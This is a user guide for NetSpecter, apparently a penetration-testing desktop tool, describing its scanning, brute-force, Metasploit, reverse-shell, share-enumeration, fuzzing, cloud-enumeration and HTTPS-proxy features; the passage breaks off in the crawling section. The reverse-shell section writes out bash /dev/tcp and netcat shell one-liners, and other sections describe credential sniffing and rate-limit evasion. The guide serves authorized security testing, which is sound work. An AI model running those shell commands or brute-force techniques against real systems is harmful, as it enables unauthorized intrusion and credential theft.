# NetSpecter: Getting Started Guide

Welcome to NetSpecter — a full-stack network security and web application testing platform for authorized penetration testers, network engineers, and security analysts. This guide covers every feature in depth, from initial installation through advanced web application exploitation techniques.

---

## Table of Contents

1. [Installation](#1-installation)
2. [Settings & Dependency Management](#2-settings--dependency-management)
3. [Target Acquisition & Scope](#3-target-acquisition--scope)
4. [Out-of-Scope Blacklist](#4-out-of-scope-blacklist)
5. [Navigating the Dashboard](#5-navigating-the-dashboard)
6. [Deep Scanning & Native Discovery](#6-deep-scanning--native-discovery)
7. [Nmap Orchestration Engine](#7-nmap-orchestration-engine)
8. [Vulnerability Discovery & CVE Mapping](#8-vulnerability-discovery--cve-mapping)
9. [NSE Script Explorer](#9-nse-script-explorer)
10. [Interactive Ncat Sockets](#10-interactive-ncat-sockets)
11. [VLAN Tag Discovery](#11-vlan-tag-discovery)
12. [Passive Network Intelligence](#12-passive-network-intelligence)
13. [SNMP Device Walking](#13-snmp-device-walking)
14. [Network Topology Map](#14-network-topology-map)
15. [Live Packet Capture & PCAP Export](#15-live-packet-capture--pcap-export)
16. [Offensive Pentest Suite](#16-offensive-pentest-suite)
    - [16A. Multi-Protocol Brute-Force (Hydra)](#16a-multi-protocol-brute-force-hydra)
    - [16B. Default Credential Spray](#16b-default-credential-spray)
    - [16C. Metasploit RPC Control Plane](#16c-metasploit-rpc-control-plane)
    - [16D. Interactive Reverse Shell Hub](#16d-interactive-reverse-shell-hub)
    - [16E. SMB/NFS Share Explorer](#16e-smbnfs-share-explorer)
    - [16F. Web Directory Fuzzer](#16f-web-directory-fuzzer)
17. [Security Monitoring & Hardening](#17-security-monitoring--hardening)
18. [Container & Cloud Enumeration](#18-container--cloud-enumeration)
19. [Web Application Testing Workspace](#19-web-application-testing-workspace)
    - [19A. Intercepting HTTPS Proxy](#19a-intercepting-https-proxy)
    - [19B. Web Crawling & Sitemap](#19b-web-crawling--sitemap)
    - [19C. Active Vulnerability Scanner](#19c-active-vulnerability-scanner)
    - [19D. Request Repeater](#19d-request-repeater)
    - [19E. Intruder](#19e-intruder)
    - [19F. Token Sequencer](#19f-token-sequencer)
    - [19G. Encoder / Decoder](#19g-encoder--decoder)
    - [19H. Response Comparer](#19h-response-comparer)
    - [19I. OAST — Out-of-Band Callback Listener](#19i-oast--out-of-band-callback-listener)
    - [19J. WebSocket Fuzzer](#19j-websocket-fuzzer)
20. [Persisting & Sharing Session Data](#20-persisting--sharing-session-data)
21. [Keyboard Shortcuts & UI Tips](#21-keyboard-shortcuts--ui-tips)

---

## 1. Installation

### Windows

Download the `.exe` installer from the [Releases page](https://github.com/robermar23/netspectre/releases) and double-click to install. The NSIS installer lets you choose the installation directory and creates Start Menu and Desktop shortcuts automatically.

### macOS

Download the `.dmg`, open it, and drag NetSpecter into your **Applications** folder. Universal binaries (Intel x64 + Apple Silicon arm64) are provided — no Rosetta translation required on M-series Macs.

### Linux

#### Recommended — `.deb` (Debian/Ubuntu/Mint):

```bash
sudo dpkg -i netspectre_*.deb
sudo apt-get install -f   # resolve any missing dependencies
```

#### Fedora/RHEL/Rocky — `.rpm`:

```bash
sudo dnf install ./netspectre-*.rpm
```

**AppImage (portable, any distro):** Requires `libfuse2` (`sudo apt install libfuse2`). Run as a normal user — do not use `sudo`. If you must run as root, pass `--no-sandbox`:

```bash
chmod +x Netspectre-*.AppImage
./Netspectre-*.AppImage --no-sandbox
```

> **Linux Note:** NetSpecter detects if you are running as root and automatically applies `--no-sandbox` internally. For `.deb` and `.rpm` packages this is handled seamlessly. Raw socket operations (deep port scanning, ICMP ping) require the `cap_net_raw` capability if not running as root:
>
> `sudo setcap cap_net_raw+eip /usr/bin/netspectre`

### Optional External Tools

Several NetSpecter features delegate to external command-line tools. Install the ones relevant to your workflow:

#### Nmap (Port Scanner & CVE Discovery):

```bash
# Debian/Ubuntu
sudo apt install nmap

# macOS (Homebrew)
brew install nmap

# Windows — download from https://nmap.org/download
```

#### Wireshark / tshark (Passive Packet Capture):

```bash
# Debian/Ubuntu
sudo apt install tshark

# macOS (Homebrew)
brew install wireshark

# Windows — download Wireshark installer from https://wireshark.org
# tshark is included in the Wireshark installation.
```

On Linux, add your user to the `wireshark` group to capture without root:

```bash
sudo usermod -aG wireshark $USER
# Log out and back in for the change to take effect.
```

#### Hydra (Multi-Protocol Brute-Force):

```bash
# Debian/Ubuntu
sudo apt install hydra

# macOS (Homebrew)
brew install hydra

# Windows — download THC-Hydra from the GitHub releases page and add to PATH.
```

#### Metasploit Framework:

Follow the official [Metasploit Installation Guide](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html). After installation, ensure `msfrpcd` is in your `PATH`.

#### SMB / NFS Clients:

```bash
# Debian/Ubuntu
sudo apt install smbclient nfs-common

# macOS (Homebrew)
brew install samba
```

#### Windows SMB — Impacket:

Windows natively caches SMB connections, which breaks credential testing and enumeration workflows. NetSpecter uses `impacket-smbclient` on Windows:

1. Install [Python 3](https://www.python.org/downloads/windows/).
2. In PowerShell or Command Prompt:

   ```cmd
   pip install impacket
   ```

3. In NetSpecter **Settings**, confirm the `smbclient` path auto-detects `impacket-smbclient.exe` (usually in your Python `Scripts` folder).

---

## 2. Settings & Dependency Management

Before scanning, open the **⚙️ Settings** modal (gear icon, top-right). NetSpecter automatically probes your `PATH` for each optional tool and displays a colored status badge:

- **Green "Installed"** — tool detected and ready
- **Red "Not Found"** — tool not in PATH; install it to unlock dependent features

Features that require a missing tool are automatically hidden from the UI until it is installed. This prevents dead-end button clicks. The full dependency list:

| Tool | Features Unlocked |
| --- | --- |
| Nmap | Nmap Deep Scan, Nmap Standard Scan, Targeted Port Analysis, Vuln Scan, NSE Explorer |
| tshark / Wireshark | VLAN Discovery, Passive Intelligence, PCAP Export, Live Capture |
| Hydra | Multi-Protocol Brute-Force |
| smbclient / impacket | SMB/NFS Share Explorer |
| msfrpcd (Metasploit) | Metasploit RPC Control Plane |

The Settings modal also lets you:

- Override the auto-detected path to any tool (e.g., if Nmap is installed to a custom prefix)
- Set the Nmap XML output directory
- Configure the Metasploit RPC host, port, and password
- Set the web app proxy listen port (default 8080)
- Export the proxy CA certificate for browser trust store installation
- Set the Playwright / Chromium executable path for active web crawling

---

## 3. Target Acquisition & Scope

NetSpecter uses a **Target Scope** model. Click the **＋ Add Hosts** button (top toolbar) to open the acquisition modal.

### The Add Hosts Modal

The modal offers four ingestion methods:

#### 🔍 Discover

Select a network interface (e.g., `eth0`, `Wi-Fi`) and click **Scan Network**. NetSpecter performs a lightweight ICMP/ARP sweep of the `/24` subnet. Discovered hosts are added to the **Staging List** below.

#### ✏️ Manual

Manually enter an IP address, hostname, or MAC address. CIDR expansion is supported — enter `192.168.1.0/24` and NetSpecter expands it into 254 individual staging entries automatically.

#### 📄 Import File

Load a `.txt` or `.csv` file containing targets (IPs, CIDRs, or hostnames), one per line. Ideal for pre-defined audit scopes on large enterprise networks.

#### 📥 Import Nmap XML

Restore a previous session from an Nmap XML output file (`-oX`). This loads hosts together with previously discovered ports, OS versions, and service metadata — no re-scanning needed.

### Staging Workflow

Before adding to the live dashboard, all hosts sit in the **Staging List**:

- Review what you are about to add
- NetSpecter automatically prevents duplicate IP entries
- Click **✕** next to any staged host to remove it from scope before committing

Once satisfied, click **✅ Add to Dashboard**.

> **Background Probing:** When you manually add or import hosts, NetSpecter automatically triggers a background enrichment probe to check liveness and pull basic metadata (MAC/Vendor) without a full Deep Scan.

---

## 4. Out-of-Scope Blacklist

Click the **🛡️ Blacklist** button in the top toolbar to define a global exclusion list.

- Add specific IPs, MAC addresses, or CIDR ranges
- Blacklisted hosts are **hidden from the dashboard** and **strictly ignored** by all active scanning engines (Native, Nmap, and the entire Pentest Suite)
- If a discovery scan finds a blacklisted host, it is discarded immediately — it never reaches the UI

Use the blacklist to exclude management infrastructure, production systems outside your test scope, or your own monitoring stations.

---

## 5. Navigating the Dashboard

After a scan completes, a grid of **Host Cards** populates the Network workspace.

### Host Card Elements

- **Pulsing green dot** — host replied to the last probe
- **IP Address** — primary identifier
- **Vendor / Manufacturer** — resolved from MAC OUI via `macvendors.com` API (e.g., `Apple Inc.`, `Raspberry Pi Foundation`)
- **OS badge** — heuristically determined from vendor and open port signatures
- **Open port count** — from the most recent scan
- **CVE badge** — red flame icon with count if Nmap vuln scan found CVEs
- **Web Vuln badge** — orange shield injected when the Web App Scanner finds vulnerabilities on this host's HTTP ports

### View Modes

Use the view toggles (top-right of the host grid):

| Mode | Best For |
| --- | --- |
| Grid Card View | Visual overview, fast at-a-glance status |
| Slim List View | Large host counts, dense information display |
| Detailed Table View | Sortable columns, copy-paste friendly |

### Filtering & Sorting

Use the search inputs above the host list to filter by:

- IP address (partial match)
- OS (Windows, macOS, Linux, Android, iOS)
- Vendor / Manufacturer
- Open port number

Sort by: IP (default), Vendor, OS, or Open Port Count.

---

## 6. Deep Scanning & Native Discovery

Click any Host Card to open the **Host Details Panel** on the right side of the screen.

### Running a Deep Scan

1. Click **Run Deep Scan**
2. NetSpecter chunks raw TCP socket probes across all **65,535 ports**
3. Open ports appear dynamically in the panel as they are discovered
4. For recognized services (HTTP, SSH, HTTPS, FTP), NetSpecter performs active banner grabs, extracting software versions, HTTP server headers, HTML page titles, and SSL/TLS certificate details
5. Click **Cancel** at any time to stop the in-progress scan

### Port Action Shortcuts

Once ports are discovered, contextual action buttons appear inline:

| Port | Action Buttons |
| --- | --- |
| 22 (SSH) | Connect (opens terminal), Brute Force |
| 80 / 443 / 8080 / 8443 | Open in Browser, Dir Fuzz, Send to Scanner |
| 139 / 445 (SMB) | Enumerate Shares, Brute Force |
| 3389 (RDP) | Connect, Brute Force |
| 21 (FTP) | Brute Force |
| Any HTTP port | Dir Fuzz, Send to Scanner |

### Deep Scan All

Click **☢️ Deep Scan All** in the top toolbar to run a deep scan on every host in the current dashboard. Progress bars appear per-host. Click the same button again to cancel the bulk operation.

---

## 7. Nmap Orchestration Engine

While NetSpecter's native engine is fast, the Nmap integration provides deeper fingerprinting, service version detection, and script-based vulnerability discovery.

### Enabling Nmap

Nmap must be installed and detected (green badge in Settings). In the Host Details Panel, use the **Engine** toggle to switch from **Native** to **Nmap**.

### Nmap Scan Types

#### Nmap Deep Scan (All Ports)

Scans all 65,535 ports with `-A` timing and full fingerprinting. Captures OS detection, version detection, and script results. Slower but comprehensive.

#### Nmap Standard Scan

Scans the default top-1000 ports with `-A` aggressive detection flags. Recommended for first-pass enumeration.

#### Targeted Port Scan

Click any discovered open port tag in the Details panel while in Nmap mode. NetSpecter launches a targeted `-sV -sC` service scan against that specific port to extract exact process/version information.

#### Nmap Vuln Scan

Runs `--script vuln` against the host to trigger NSE vulnerability detection scripts. Results are parsed in real-time for CVE identifiers (see Section 8).

### Installing Nmap

If Nmap is not detected, a blue banner appears in the Details panel with a link to the download page. NetSpecter tries `which nmap` (Linux/macOS) and `where nmap` (Windows) plus common installation prefixes. If your installation is in a non-standard path, set it manually in **Settings**.

---

## 8. Vulnerability Discovery & CVE Mapping

When you run the **Nmap Vuln Scan**, NetSpecter intercepts the raw terminal output buffer asynchronously:

- Searches for `VULNERABILITY:` blocks in the Nmap output stream
- Extracts the CVE identifier, CVSS severity score (Critical / High / Medium / Low), and description
- Dynamically generates links to `vulners.com` and `exploit-db.com` when public exploit PoCs are available
- Injects stylized vulnerability definition cards into the Host Details panel
- Updates the host card's security badge:
  - **Red flame + CVE count** — one or more CVEs found
  - **Green "Audited Secure"** — vuln scan completed with no findings

All discovered CVEs are cached in the host's `deepAudit` object and persisted when you save the session (see Section 20).

---

## 9. NSE Script Explorer

At the bottom of the Nmap actions list is the **NSE Explorer** dropdown. NetSpecter scans your filesystem to discover all installed `.nse` Lua scripts (600+) and presents them in a searchable, categorized selector.

### Using the NSE Explorer

1. Type in the search box to filter scripts (e.g., `smb-`, `http-`, `ssl-`)
2. Scripts are tagged with color-coded risk badges:
   - **Green "safe"** — passive information gathering
   - **Blue "discovery"** — active but benign probing
   - **Yellow "intrusive"** — may trigger logs or affect target state
   - **Red "vuln/exploit"** — active exploitation attempts
3. Select the script from the dropdown
4. Optionally add script arguments in the secondary input (e.g., `--script-args user=admin,pass=admin`)
5. Click **Run Custom Script** — output streams to the terminal block in the Details panel

---

## 10. Interactive Ncat Sockets

The **Ncat** engine tab in the Host Details panel provides raw TCP/UDP socket connectivity directly from the GUI — no terminal window required.

1. Switch to the **Ncat** tab inside the Details panel
2. Enter the target **Port**
3. Fill the **Payload** field (e.g., `GET / HTTP/1.0\r\n\r\n` or any raw bytes)
4. Click **Connect & Send** — the stream stays open for bidirectional communication, visualizing raw byte exchanges in real time

---

## 11. VLAN Tag Discovery

NetSpecter integrates with `tshark` to passively listen for 802.1Q-tagged frames — useful for identifying misconfigured trunk ports or testing VLAN hopping defenses.

**Requirements:** tshark installed and enabled in Settings.

1. Click the **🦈 VLAN Discovery** button in the top control bar to open the VLAN panel
2. Select the physical network interface from the dropdown
3. Click **Start Capture**
4. NetSpecter runs a tshark capture filtered to VLAN-tagged packets
5. As tagged frames are detected, the UI extracts the **VLAN ID** and source/destination MAC addresses, appending them to the live results panel

Tagged frames on an access port indicate a VLAN hopping risk. Legitimate trunk ports should only appear on uplink interfaces.

---

## 12. Passive Network Intelligence

The **Passive Intelligence** suite monitors the network silently using tshark. Click the **🕵️ Passive Intelligence** button in the top toolbar to open the panel.

**Requirements:** tshark installed and enabled in Settings.

### Setup

1. Select your listening interface from the dropdown
2. Toggle the modules you want active (each module runs an independent tshark filter)
3. Click **Start Monitoring** — all selected modules start simultaneously

### Modules

#### DHCP Rogue Detection

Monitors DHCP OFFER and ACK messages. When an unknown DHCP server is detected offering IP addresses on your subnet, a high-severity alert card is immediately injected into the dashboard with the rogue server's MAC and IP.

#### Credential Sniffer

> **Legal Warning:** Activating this module captures cleartext credentials transmitted on your network. You must accept a legal disclaimer before first use. Only activate this on networks you are explicitly authorized to monitor.

Extracts credentials from FTP, Telnet, HTTP Basic Auth, POP3, and IMAP traffic. Captured credentials are displayed in the Passive Intel panel and are **never persisted to disk**.

#### DNS Harvester

Monitors DNS and mDNS queries passively. Any host that announces itself through name resolution (even if it ignores ICMP pings) is automatically discovered and promoted to your main dashboard — no active probe required. Useful for finding IoT devices, printers, and Apple devices that suppress ICMP.

#### ARP Spoofing Detection

Monitors ARP replies for IP-to-MAC mapping conflicts. When an IP address is claimed by two different MAC addresses within a short window, or when gratuitous ARP announcements are detected, a Man-in-the-Middle alert fires immediately with the conflicting mappings shown side-by-side.

#### Rogue DNS Detection

Establishes a baseline of trusted DNS responders by observing the first few DNS responses. If subsequent DNS replies originate from an unexpected server, or if conflicting A records are returned for the same hostname, a high-severity alert card is injected into the dashboard indicating potential DNS hijacking.

### PCAP Export

At the bottom of the Passive Intelligence panel, click **📥 Export PCAP...** to launch a targeted packet capture. Configure:

- Capture interface
- BPF filter (e.g., `host 192.168.1.5` or `tcp port 80`)
- Capture duration (seconds)
- Output file path

Click **Start Capture** — the panel streams packet summaries in real time. When complete (or when you click Stop), the `.pcap` file is saved and ready for offline analysis in Wireshark.

---

## 13. SNMP Device Walking

NetSpecter supports SNMPv1, v2c, and v3 walking to extract detailed operational data from routers, switches, printers, and servers.

### Walking a Device

1. Click a host in the dashboard to open the **Host Details Panel**
2. In the **Actions** section, click **SNMP Walk**
3. Configure the walk parameters:
   - **Version**: v1, v2c, or v3
   - **Community String** (v1/v2c): typically `public` for read-only access
   - **Security Name / Auth / Privacy** (v3): USM credentials
   - **OID Prefix** (optional): scope the walk (e.g., `1.3.6.1.2.1.1` for system info only)
4. Click **Start Walk**

### Results

NetSpecter concurrently pulls and parses:

- **System Description** (sysDescr) — firmware version, OS, hardware model
- **Interface Statistics** — interface names, speeds, byte counters (ifTable)
- **IP Routing Table** — routes and next-hops
- **ARP Cache** — IP-to-MAC mappings seen by the device
- **CPU / Memory** (if supported by vendor MIB)

Results are grouped by OID category in an expandable tree view. Click any row to see the full OID path and raw value.

---

## 14. Network Topology Map

Transform the flat host grid into an interactive visual graph.

1. Discover hosts via the standard network scan
2. Click the **📡 Topology** tab in the top navigation bar
3. Your network is rendered using Cytoscape.js with hosts clustered by subnet and linked to their detected gateways
4. Interact with the graph:
   - Click any node to open its Host Details panel
   - Use the **Layout** dropdown to switch between Force-Directed, Hierarchical, and Concentric layouts
   - Click the **Camera** icon to export the graph as a PNG
   - Use scroll-to-zoom and drag-to-pan to navigate large networks

Hosts with open SMB ports (139/445) are styled distinctly from HTTP-only hosts, providing quick visual segmentation of attack surface.

---

## 15. Live Packet Capture & PCAP Export

For deep forensic visibility into a specific host:

1. Navigate to the **Passive Intelligence** panel, or right-click a host card and select **Capture Packets**
2. Set a **Capture Filter** (BPF syntax, e.g., `host 192.168.1.5` or `tcp port 443`)
3. Set a **Duration** (or leave blank for continuous capture)
4. Click **Start Capture**

The panel streams packet summaries in real time including:

- Source / Destination IP and port
- Protocol (TCP, UDP, ICMP, HTTP, TLS, DNS, ARP)
- Payload snippet (for cleartext protocols)
- Running stats: protocol distribution percentages, top talkers by byte count, cleartext protocol alerts

Click **Stop & Save** at any time to write the capture to a `.pcap` file for Wireshark analysis.

---

## 16. Offensive Pentest Suite

> **Authorization Required:** All offensive tools in this section perform active, potentially disruptive operations. You must have explicit written authorization to test any system you do not own. NetSpecter displays a **Pentest Consent Gate** on first use — you must accept it before any offensive tool activates.

The consent gate is shown once per session. It records your acknowledgment in memory (not on disk) and does not expire until the application is closed.

---

### 16A. Multi-Protocol Brute-Force (Hydra)

Automate credential discovery across SSH, FTP, Telnet, HTTP, SMB, RDP, and other services using the integrated Hydra engine.

**Requirements:** Hydra installed and enabled in Settings.

#### Starting a Brute-Force Attack

#### Method 1 — From Host Details:

1. Open the Host Details panel for your target
2. Click the **Brute Force** button next to any detected service port (e.g., next to port 22 for SSH, port 80 for HTTP)
3. The Brute-Force modal pre-fills the protocol based on the selected port

#### Method 2 — From Header Button:

1. Click the **⚔️ Brute Force** button in the top toolbar to open the modal manually
2. Enter the target IP and select the protocol

#### Configuring the Attack

- **Protocol**: SSH, FTP, Telnet, HTTP-GET, HTTP-POST, SMB, RDP, IMAP, POP3, SMTP, MySQL, and others
- **Username**: Single username or toggle **Load User List** to import a `.txt` wordlist
- **Password Wordlist**: Click **Browse** to select a password list file. NetSpecter ships with `resources/wordlists/basicauth.txt` as a starter list
- **Threads**: Number of parallel connection attempts (default 4 — increase with caution to avoid lockouts)
- **Delay**: Milliseconds between requests per thread (useful for rate-limit evasion)

#### Running

Click **Start Brute-Force**. Results stream live:

- Green rows = successful credential pair
- Red rows = rejected
- Orange rows = connection error

Click **Stop** at any time. Export results as CSV using the **Export** button.

---

### 16B. Default Credential Spray

Spray a target with known default credential pairs without Hydra — using pure Node.js transports. This is faster to start than Hydra for quick checks.

**Supported Protocols:** SSH, HTTP Basic Auth, FTP, Telnet, SMB

#### Starting a Spray

1. Click the **Cred Spray** button in the top toolbar, or right-click a host → **Pentest** → **Default Credential Spray**
2. Select the target protocol
3. Choose a credential set:
   - **Built-in defaults** — common default pairs (admin/admin, root/root, admin/password, etc.)
   - **Custom list** — load a CSV file with `username,password` pairs
4. Configure concurrency (default 5 simultaneous attempts)
5. Click **Start Spray**

Successful hits are highlighted in green with a distinct hit sound. Results can be exported to CSV. All credential data is held in memory only — nothing is written to disk.

---

### 16C. Metasploit RPC Control Plane

Orchestrate the Metasploit Framework directly from NetSpecter via MSFRPC.

**Requirements:** Metasploit Framework installed. Start the RPC daemon:

```bash
msfrpcd -P your_password -S -f
# Default: listens on 127.0.0.1:55553
```

#### Connecting

1. Click the **🎯 Metasploit** button in the top toolbar (only visible when Metasploit is detected in Settings)
2. In the MSF modal, enter your RPC credentials:
   - Host (default `127.0.0.1`)
   - Port (default `55553`)
   - Password
3. Click **Connect** — NetSpecter establishes an MSFRPC session and loads the module database

#### Browsing & Launching Exploits

1. Use the **Module Search** box to filter exploits (e.g., `ms17_010`, `eternalblue`, `http`)
2. Click a module row to select it — options populate in the right pane
3. Fill in required options:
   - `RHOSTS` — pre-filled from the currently selected network host if launched from Host Details
   - `RPORT` — auto-filled from detected open ports when applicable
   - `PAYLOAD` — select from compatible payloads in the dropdown
4. Click **Run Exploit** — output streams to the terminal block in real time

#### Session Management

Active sessions appear in the **Sessions** tab of the MSF modal:

- **Shell sessions** — interact with a basic command shell
- **Meterpreter sessions** — full Meterpreter command interface
- Click **Interact** to open a live terminal to the session
- Click **Kill** to terminate a session

---

### 16D. Interactive Reverse Shell Hub

A dedicated listener for incoming reverse shell connections with built-in payload generation.

#### Opening the Listener

1. Click the **Reverse Shell** button in the top toolbar to open the RevShell panel (slides in from the right)
2. Select the listener **Port** (default 4444)
3. Select the **Shell Type**:
   - **Bash** — `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`
   - **Python** — Python 3 `socket` one-liner
   - **PowerShell** — PowerShell TCP reverse shell
   - **PHP** — `exec()` based PHP reverse shell
   - **Netcat** — `nc -e /bin/sh LHOST LPORT`
4. NetSpecter auto-populates `LHOST` with your detected local IP address
5. Click **Copy Payload** to copy the ready-to-execute command to clipboard

#### Starting the Listener

Click **Start Listener**. NetSpecter opens a TCP server on the configured port in the main process.

When a reverse shell connects:

- A terminal session opens in the panel
- Type commands directly — responses stream back in real time
- Click **Kill Session** to terminate the connection
- Multiple simultaneous connections are supported — each gets its own session tab

---

### 16E. SMB/NFS Share Explorer

Expose misconfigured network shares and sensitive data storage.

**Requirements:** `smbclient` (Linux/macOS) or `impacket-smbclient` (Windows) installed and enabled in Settings.

#### Enumerating Shares

**Method 1** — Click **Enumerate Shares** in the Host Details panel when ports 139 or 445 are open.

**Method 2** — Click the **🗂️ Share Enum** button in the top toolbar and enter a target IP manually.

The panel performs:

1. Null session enumeration attempt (no credentials)
2. Guest session attempt
3. If credentials are provided (optional), authenticated enumeration

#### Browsing Files

When shares are found, they appear as folders in the left pane. Click a share to expand its directory tree:

- Navigate using the breadcrumb bar at the top of the file pane
- Click any file to see metadata (size, modified date, permissions)
- Right-click a file → **Download** to save it locally for analysis

Shares are color-coded by access level:

- **Red** — world-readable (no credentials required)
- **Orange** — guest-accessible
- **Blue** — authenticated access only
- **Gray** — access denied

---

### 16F. Web Directory Fuzzer

Discover hidden files and directories on web servers with zero external dependencies.

#### Opening the Fuzzer

**Method 1** — Click the **Dir Fuzz** button next to any detected HTTP port in the Host Details panel.

**Method 2** — Click the **🔎 Dir Fuzz** button in the top toolbar and enter a base URL manually.

#### Configuration

- **Wordlist**:
  - **Built-in** — 50 common paths (`/admin`, `/config`, `/.git`, `/backup`, `/api`, etc.)
  - **Custom file** — browse to a wordlist file (one path per line, up to 100,000 entries)
- **Extensions** — append file extensions to each path: `.php`, `.html`, `.bak`, `.txt`, `.json`. Toggle individually.
- **Status Code Filter** — show only responses with selected status codes (200, 201, 301, 302, 403, 500)
- **Concurrency** — simultaneous requests, 1–50 (default 20)
- **Timeout** — per-request timeout in milliseconds

#### Running the Fuzz

Click **Start Fuzzing**. Results appear in the table as hits arrive:

| Column | Description |
| --- | --- |
| Status | HTTP status code (color-coded: 200=green, 3xx=blue, 403=orange, 5xx=red) |
| Path | The discovered path |
| Size | Response body size in bytes |
| Duration | Request round-trip time |

Click any row to see the response headers and a body preview. Click **Export CSV** to save the full results. Click **Clear** to reset.

---

## 17. Security Monitoring & Hardening

### Continuous Hardening Monitor

The Hardening Monitor schedules recurring security snapshots of individual hosts and alerts when the security posture changes.

#### Starting a Monitoring Schedule

1. Click the **📊 Hardening** button in the top toolbar to open the Hardening Monitor panel
2. Select a target host from your dashboard (or enter an IP manually)
3. Choose a **scan interval**: 5 minutes, 15 minutes, 1 hour, 6 hours, or 24 hours
4. Choose what to monitor:
   - Open port changes
   - Service banner changes
   - SSL/TLS certificate changes (expiry, CN changes, fingerprint changes)
   - New CVEs from Nmap vuln scripts
5. Click **Start Monitoring**

#### Delta Alerts

Each scheduled scan is compared against the last known baseline. The delta view shows:

- **🟢 Added** — new open ports or new CVEs found since last scan
- **🔴 Removed** — ports that were open are now closed (could indicate service restart or firewall change)
- **🟡 Changed** — banner text changed (potential patching or version change)

Alert cards appear in the panel and optionally on the host card. A persistent history of all delta events is maintained per-host for the session.

### Security Analyzer

The Security Analyzer aggregates all available scan data for a host and produces a prioritized risk assessment.

1. Open the Host Details panel
2. Click **Analyze Risk** in the Actions section
3. The analyzer combines:
   - Open ports and their associated service risks
   - OS fingerprint (EOL systems flagged)
   - CVE findings from Nmap scans
   - Banner strings with known vulnerable version patterns
   - Passive intel findings (cleartext credentials, DHCP/DNS anomalies)
4. Results are displayed as a risk score (0–100) with a breakdown by category:
   - Network exposure (open attack surface)
   - Patch level (CVE severity distribution)
   - Protocol risk (cleartext protocols detected)
   - Configuration risk (default credentials, weak TLS, missing security headers)
5. Each category includes specific, actionable remediation recommendations

---

## 18. Container & Cloud Enumeration

The Cloud Enum panel probes discovered hosts for exposed container orchestration and cloud infrastructure endpoints — some of the most high-severity misconfigurations found in modern environments.

#### Opening Cloud Enum

Click the **☁️ Cloud Enum** button in the top toolbar, or open Host Details and click **Cloud Enum** when container indicator ports (2375, 2379, 6443, 8443, 10250, etc.) are detected. These ports trigger a prominent **⚠ CRITICAL PORTS** badge on the host card.

#### Available Probes

Toggle individual probes before scanning:

| Probe | Default Port | What It Checks |
| --- | --- | --- |
| Docker Daemon | 2375 / 2376 | Unauthenticated Docker API (`/containers/json`, `/images/json`) |
| Kubernetes Kubelet | 10250 / 10255 | Pod listing, exec endpoints, anonymous access |
| Kubernetes API Server | 6443 / 8443 | Unauthenticated cluster access, RBAC bypass |
| etcd | 2379 | Key-value store access, Kubernetes secret exposure |
| AWS IMDSv1 | — | `169.254.169.254` metadata endpoint |
| GCP Metadata | — | `metadata.google.internal` compute metadata |
| Azure IMDS | — | Azure instance metadata |
| Consul | 8500 | KV store access, service registry |
| Vault | 8200 | Secrets engine access |
| Prometheus | 9090 | Metrics endpoint, target enumeration |
| Grafana | 3000 | Default/no authentication check |
| Portainer | 9000 | Container management UI access |

#### Running the Scan

1. Select target host and toggle desired probes
2. Set concurrency (default 5 parallel probes)
3. Click **Start Enumeration**

#### Reading Results

Findings are displayed as cards, color-coded by severity:

- **🔴 Critical** — unauthenticated access to container/cloud management APIs (immediate RCE or secret extraction risk)
- **🟡 Warning** — partially exposed endpoints, version disclosure
- **🔵 Info** — service detected but access denied

Click any finding card to see the raw response, the specific endpoint that was probed, and remediation guidance. Export all findings as JSON using the **Export** button.

---

## 19. Web Application Testing Workspace

NetSpecter includes a complete web application security testing workspace — accessible by clicking the **Web App** tab at the top of the main window. This switches the view from the Network workspace to the Web App workspace, which contains eight integrated tools.

> **Authorization Required:** Active scanning, active crawling, and Intruder attacks require the Pentest Consent Gate to be accepted.

---

### 19A. Intercepting HTTPS Proxy

The intercepting proxy is the foundation of the Web App workspace. It sits between your browser and the target application, giving you full visibility into every HTTP and HTTPS request.

#### How the Proxy Works

NetSpecter runs an HTTP proxy server on `127.0.0.1:8080` (port configurable in Settings). For HTTPS, it handles `CONNECT` tunnel requests and issues a dynamically generated TLS certificate for each hostname — signed by a locally-generated Certificate Authority (CA). This allows NetSpecter to decrypt and inspect all HTTPS traffic transparently.

#### Setup — One-Time CA Certificate Installation

You only need to do this once per browser/system.

1. Open NetSpecter **Settings** → **Web App Proxy** section
2. Click **Export CA Certificate** — saves `netspectre-ca.pem` to your Downloads folder
3. Install the certificate in your browser's trust store:

   **Chrome / Edge:**
   Settings → Privacy and Security → Security → Manage Certificates → Authorities → Import → select `netspectre-ca.pem` → check "Trust this certificate for identifying websites"

   **Firefox:**
   Settings → Privacy & Security → Certificates → View Certificates → Authorities → Import → select `netspectre-ca.pem` → check "Trust this CA to identify websites"

   **macOS System Keychain (for Safari and system-wide):**

   ```bash
   sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain netspectre-ca.pem
   ```

   **Linux (Debian/Ubuntu):**

   ```bash
   sudo cp netspectre-ca.pem /usr/local/share/ca-certificates/netspectre-ca.crt
   sudo update-ca-certificates
   ```

4. Configure your browser's proxy settings:
   - HTTP Proxy: `127.0.0.1`
   - Port: `8080` (or your configured port)
   - Enable "Also use for HTTPS"

#### Starting the Proxy

In the Web App workspace → **Proxy** tab:

1. Click **Start Proxy** — the status indicator turns green
2. Browse the target application in your browser
3. All requests appear in the **Request History** table in real time

#### Request History Table

Each row shows: timestamp, HTTP method, status code, hostname, path, response size, and duration. Click any row to open the full request/response viewer with syntax-highlighted headers and body.

#### Filtering History

Use the filter bar above the table to narrow results by:

- Hostname (partial match)
- HTTP method (GET, POST, PUT, etc.)
- Status code (exact or range, e.g., `4xx`)
- Path contains (partial string match)
- Response size range

#### Intercept Mode

Toggle **Intercept** to pause in-flight requests for manual inspection:

1. When a request is intercepted, it appears in the **Intercept** pane with the full raw request
2. Edit any part of the request (headers, URL, body)
3. Click **Forward** to send the modified request, or **Drop** to discard it

#### HAR Export

Click **Export HAR** to save the full request history as a [HAR 1.2](http://www.softwareishard.com/blog/har-12-spec/) JSON file, compatible with browser DevTools, Postman, and security analysis tools.

---

### 19B. Web Crawling & Sitemap

The Sitemap tab builds a structured map of the target application's attack surface.

#### Passive Crawling (Always On)

Every request that flows through the proxy is automatically added to the sitemap. No additional action required. The sitemap tree populates as you browse normally.

#### Active Crawling (Playwright)

Active crawling launches a headless Chromium browser to follow links, submit forms, and discover JavaScript-rendered endpoints that would be invisible to a proxy-only approach.

**Requirements:** Playwright / Chromium executable path configured in Settings.

1. In the Sitemap tab, click **Active Crawl**
2. Enter the seed URL (e.g., `https://target.com`)
3. Configure:
   - **Depth limit** — how many link-hops from the seed to follow (default 3)
